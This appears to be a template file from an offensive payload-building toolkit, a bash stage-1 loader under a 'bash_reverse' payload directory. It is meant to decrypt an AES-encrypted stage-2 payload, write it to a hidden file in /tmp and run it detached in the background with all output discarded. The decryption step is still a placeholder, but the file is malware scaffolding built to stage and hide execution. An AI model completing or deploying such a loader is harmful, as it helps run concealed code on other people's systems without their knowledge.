# payloads/linux/bash_reverse/template.sh

#!/bin/bash
# AES-256-CBC decryptor template for Linux stage 1
# This file will be populated by build_and_run.sh with decrypted Stage 2

PAYLOAD="REPLACE_AES"  # Format: ivhex:base64cipher

# Placeholder — write decrypted payload to a temp file and execute
TMP=$(mktemp /tmp/.payloadXXXXXX.sh)
echo "echo '[!] AES decryption logic goes here'" > "$TMP"
chmod +x "$TMP"
nohup bash "$TMP" &>/dev/null &
